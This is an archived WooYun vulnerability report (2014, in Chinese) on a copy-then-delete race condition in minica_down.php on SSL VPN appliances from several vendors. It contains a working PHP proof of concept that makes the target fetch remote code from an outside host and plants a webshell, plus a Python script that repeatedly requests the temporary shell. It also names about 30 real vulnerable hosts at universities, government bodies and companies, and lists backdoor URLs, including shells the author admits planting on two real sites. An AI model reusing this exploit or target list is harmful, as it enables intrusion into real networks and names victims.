@@ -1,0 +1,409 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		国内外多家vpn设备厂商批量漏洞(续集一)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		国内外多家vpn设备厂商批量漏洞(续集一)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/felixk3y">felixk3y</a> 
+</li><li>提交时间：		2014-01-07 18:27</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-07：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-12：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-15：	细节向第三方安全合作伙伴开放<br/>
+									2014-01-22：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-01：	细节向普通白帽子公开<br/>
+									2014-02-21：	细节向实习白帽子公开<br/>
+									2014-04-07：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">利用此漏洞可导致任意文件写入，任意代码/命令执行,大量内网可免门票任意漫游 漫游...<br />
+同时该漏洞涉及到包括网御神州、天融信、西安网赢、卫士通、吉大正元、美国凹凸、德国 ANIX等多家VPN厂商设备在政务、地产、运营商、政府部门、高校、企业、公安、司法、银行等行业存在的任意文件下载、远程命令执行、维护后门、三方平台帐号泄漏、恶意客户端下发等高位漏洞。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">#1 首先请看：<br />
+<br />
+</p><pre><code> <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-024919">WooYun: [浅谈内网安全]--国内外多家vpn设备厂商批量漏洞</a> </code></pre><p class='detail'><br />
+<br />
+漏洞修复中，@紫梦芊 提到修复方法，详见如下：<br />
+<br />
+</p><pre><code>exec(&quot;cp &quot;.$_POST[&#039;realfile&#039;].&quot; &quot;.$_POST[&#039;path&#039;].&quot;&quot;);改为<br />
+copy($_POST[&#039;realfile&#039;],$_POST[&#039;path&#039;])<br />
+exec(&quot;rm &quot;.$_POST[&quot;path&quot;].&quot;&quot;);改为<br />
+unlink($_POST[&#039;path&#039;])</code></pre><p class='detail'><br />
+<br />
+嘿，没想到这些厂商还真是这样修复的...<br />
+<br />
+咦? 这样修复没有问题啊,但真的是没问题吗?要是真的没问题，就不会有下文了，哈哈...<br />
+<br />
+各位看官，且听我细细道来...<br />
+<br />
+#2 我们打开根目录下的minica_down.php文件,代码贴出来<br />
+<br />
+</p><pre><code>&lt;?<br />
+if($_POST[&#039;realfile&#039;])<br />
+	copy($_POST[&#039;realfile&#039;],$_POST[&#039;path&#039;]);<br />
+//$_POST[path] = mb_convert_encoding($_POST[path],&quot;GBK&quot;,&quot;UTF-8&quot;);<br />
+$file = mb_convert_encoding($_POST[file],&quot;GBK&quot;,&quot;UTF-8&quot;);<br />
+header(&quot;Pragma:&quot;);<br />
+header(&quot;Cache-Control:&quot;);<br />
+header(&quot;Content-type:application/octet-stream&quot;);<br />
+header(&quot;Content-Length:&quot;.filesize($_POST[path]));<br />
+header(&quot;Content-Disposition:attachment;filename=\&quot;$file\&quot;&quot;);<br />
+readfile($_POST[path]);<br />
+if($_POST[&#039;realfile&#039;])<br />
+	unlink($_POST[&quot;path&quot;]);<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+第二行代码：<br />
+<br />
+</p><pre><code>copy($_POST[&#039;realfile&#039;],$_POST[&#039;path&#039;]);</code></pre><p class='detail'><br />
+<br />
+从POST提交的realfile,复制到POST提交的path参数<br />
+<br />
+倒数三行代码：<br />
+<br />
+</p><pre><code>if($_POST[&#039;realfile&#039;])<br />
+	unlink($_POST[&quot;path&quot;]);<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+如果提交了realfile参数,则删除path参数所提交的文件，即<br />
+<br />
+假如我们post提交,realfile=/ssl/www/test.jpg &amp; path=/ssl/www/admin/shell.php<br />
+<br />
+很容易的得到我们想要的shell,但在代码的最后三行,最终删除了path即 删除了我们想要的shell:/ssl/www/admin/shell.php<br />
+<br />
+<br />
+<br />
+这段代码的逻辑看起来没什么问题，但是呢 我们人是最善于思考的动物，SO...<br />
+<br />
+<br />
+<br />
+#3 思考中... ...<br />
+<br />
+#4 思考后的结果<br />
+<br />
+程序的执行需要一个过程，哪怕这个过程很短很短,鉴于此，我们有了如下的结果...<br />
+<br />
+（要是我们能在程序删除我们想要的那个shell前，通过一定的方法抢在其前面访问那个shell,这个shell帮我们生成另一个shell，那么这个新生成的shell总不会被删除吧...）<br />
+<br />
+这里简单小结一下<br />
+<br />
+正常情况：<br />
+<br />
+copy成shell1---&gt;删除shell1;<br />
+<br />
+被攻击时的情况：<br />
+<br />
+copy成shell1---&gt;访问shell1--&gt;shell1生成shell2--&gt;删除shell1 明白了吧?<br />
+<br />
+<br />
+<br />
+有了想法，那就开始行动吧...<br />
+<br />
+方法一：<br />
+<br />
+我们可以用py写一个多线程的代码,唯一功能是：不停的访问copy成的shell1<br />
+<br />
+</p><pre><code>#coding=utf-8<br />
+<br />
+import os<br />
+import urllib2<br />
+import urllib<br />
+import threading<br />
+<br />
+class Query(threading.Thread):<br />
+    def __init__(self,url):<br />
+        threading.Thread.__init__(self)<br />
+        self.url = url<br />
+    def run(self):<br />
+        while True:<br />
+            print &#039;Testing...&#039;<br />
+            try:<br />
+                rep = urllib2.urlopen(self.url,timeout=2)<br />
+            except :<br />
+                pass<br />
+<br />
+def main():<br />
+    threads = []<br />
+    url = &quot;http://www.vulns.org/shell1.php&quot;<br />
+    for i in range(20):<br />
+        t = Query(url)<br />
+        t.start()<br />
+        threads.append(t)<br />
+    for t in threads:<br />
+        t.join()<br />
+if __name__==&quot;__main__&quot;:<br />
+    main()</code></pre><p class='detail'><br />
+<br />
+方法二：<br />
+<br />
+将post提交和访问shell让程序同时进行...<br />
+<br />
+经过一系列的测试：方法一成功的几率很小，这里 我们选择方法二<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">#5 漏洞最终利用<br />
+<br />
+这里 我们用php写漏洞利用的POC:<br />
+<br />
+</p><pre><code>&lt;?php<br />
+set_time_limit(0);<br />
+error_reporting(0);<br />
+<br />
+function get($url){<br />
+	$ch = curl_init();<br />
+	curl_setopt($ch, CURLOPT_URL, $url);<br />
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);//https请求,不验证证书和hosts<br />
+	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);<br />
+	curl_setopt($ch, CURLOPT_HEADER,0);<br />
+	$output = curl_exec($ch);<br />
+	curl_close($ch);<br />
+	return $output;<br />
+}<br />
+function post($url,$params){<br />
+	$ch = curl_init();<br />
+	curl_setopt($ch, CURLOPT_URL, $url);<br />
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);<br />
+	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);<br />
+	curl_setopt($ch, CURLOPT_HEADER, 0);<br />
+	curl_setopt($ch, CURLOPT_POST, 1);<br />
+	curl_setopt($ch, CURLOPT_POSTFIELDS, $params);<br />
+	$output = curl_exec($ch);<br />
+	curl_close($ch);<br />
+	return $output;<br />
+}<br />
+$i=0;<br />
+$url = &quot;https://vpn.com.cn/minica_down.php&quot;;<br />
+$geturl1 = &quot;https://vpn.com.cn/sub_ca_reglog.php&quot;;<br />
+$postdata = &quot;realfile=http://www.xxx.com/exp.txt&amp;path=sub_ca_reglog.php&quot;;<br />
+while(++$i&lt;5) {<br />
+	echo &quot;\nTesting[$i]....\n&quot;;<br />
+    post($url,$postdata);<br />
+	get($geturl1);<br />
+}<br />
+$vali_url = &quot;https://vpn.com.cn/shell.php&quot;;<br />
+$resp = get($vali_url);<br />
+echo $resp;<br />
+if(preg_match(&#039;/200 OK/&#039;,$resp)){<br />
+	echo &quot;Success! shell is : $vali_url, Pass is [1@3]&quot;;<br />
+}else{<br />
+	echo  &quot;-------&gt;Fail!\n\n&quot;;<br />
+}<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+POC说明：<br />
+<br />
+POST提交参数：<br />
+<br />
+</p><pre><code>realfile=http://www.com.cn/2.txt&amp;path=sub_ca_reglog1.php</code></pre><p class='detail'><br />
+<br />
+realfile参数是远程的一个文件，目的是生成最终的shell 大小最好几十KB，为我们访问中间的shell1争取时间 增加成功的概率嘛，内容如下：<br />
+<br />
+</p><p class="detail"><a href="../images/071807577f879c4b9686e57476972e83681030c3.jpg" target="_blank"><img src="../images/071807577f879c4b9686e57476972e83681030c3.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+path是我们想要生成的文件，这里是：sub_ca_reglog1.php<br />
+<br />
+<br />
+<br />
+Tips：由于这里只是POC,所以在运行的时候 最好多试几次,要是试了几次任然没生成shell，此时可手动访问：http://www.com.cn/sub_ca_reglog1.php 说不定会有意想不到的效果哦.<br />
+<br />
+#6 shell<br />
+<br />
+https://svpn.mbatec.com.tw<br />
+<br />
+https://vpn.mcut.edu.tw 这两个url,对不起了啊,毕竟为了测试嘛<br />
+<br />
+</p><p class="detail"><a href="../images/071814591c3e594ff20a2ddfed93a25bac55bbff.jpg" target="_blank"><img src="../images/071814591c3e594ff20a2ddfed93a25bac55bbff.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/07181558f1b0da46136b94f77a76a9729dbd4915.jpg" target="_blank"><img src="../images/07181558f1b0da46136b94f77a76a9729dbd4915.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+同时我发现，有很多网站被人留了后门，清理一下吧<br />
+<br />
+https://xxxxxxx/admin/free.php 密码cmd<br />
+<br />
+https://svpn.mbatec.com.tw/welcome_time1.php<br />
+<br />
+https://svpn.mbatec.com.tw/sub_ca_reglog1.php<br />
+<br />
+https://svpn.mbatec.com.tw/sub_ca_reglog2.php<br />
+<br />
+https://svpn.mbatec.com.tw/sub_ca_reglog3.php<br />
+<br />
+#7 漏洞站点(摘自@紫梦芊)<br />
+<br />
+至少有如下的站点，未列完.....<br />
+<br />
+</p><pre><code>https://vpn.bit.edu.cn/ 北京理工<br />
+https://sslvpn.bjtu.edu.cn/ 北交大<br />
+https://125.46.88.100/ 郑州大学<br />
+https://219.80.0.19/p 国泰地产集团<br />
+https://info.nai.edu.cn/ 北京国家会计学院<br />
+https://124.205.79.78/ 北大计算中心<br />
+https://210.82.53.201/ 北京联合大学<br />
+https://vpn.cnu.edu.cn/ 首都师大<br />
+https://vpn.mcut.edu.tw/ 台湾明志科技大学<br />
+https://ac.whlib.gov.cn 武汉图书馆<br />
+https://sslvpn.nhcue.edu.tw 新竹教育大学<br />
+https://isms.ydu.edu.tw/ 育達商業科技大學<br />
+https://sslvpn.ydu.edu.tw/ 育達商業科技大學<br />
+https://vpn.cute.edu.tw 中国(台湾)科技大学<br />
+https://sslvpn.ntue.edu.tw 国立台北教育大学<br />
+https://vpn.psi.com.tw 升阳国际<br />
+https://maltimur.jksm.gov.my/ 马来西亚某政府网站<br />
+https://vpn.ccom.edu.cn 中央音乐学院<br />
+https://vpn.dlmu.edu.cn 大连海事大学<br />
+https://vpn.wanfang.edu.cn 河南理工<br />
+https://vpn.genius.com.cn 深圳巨灵<br />
+https://sslvpn.changhongit.com 长虹佳华<br />
+https://vpn.jnrd.com.cn 北京京能热电<br />
+https://sslvpn.kworld.com.tw 廣寰台北辦公室<br />
+https://www.oo586.com/ 易宝支付<br />
+https://svpn.mbatec.com.tw 新碩資訊<br />
+https://sslvpn.szs.com.tw 新日兴<br />
+https://sslvpn.gzcatv.net 广数传媒<br />
+https://e.nais.net.cn 农业部农E通<br />
+https://vpn.thcic.cn 清华</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">神马意思,你们懂,要是不懂 再问我,OK... </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/felixk3y" title="felixk3y">felixk3y</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-048202" title="国内外多家vpn设备厂商批量漏洞(续集一)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2014-01-12 11:36</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认并复现所述况，并根据利用原理对EXP进行了改写，提高了测试成功率。在9日上午已经复现多个实例，不过在9日下午之后测试结果出现新的变化。需要汇总进一步的结果才进行处置。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="48202";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
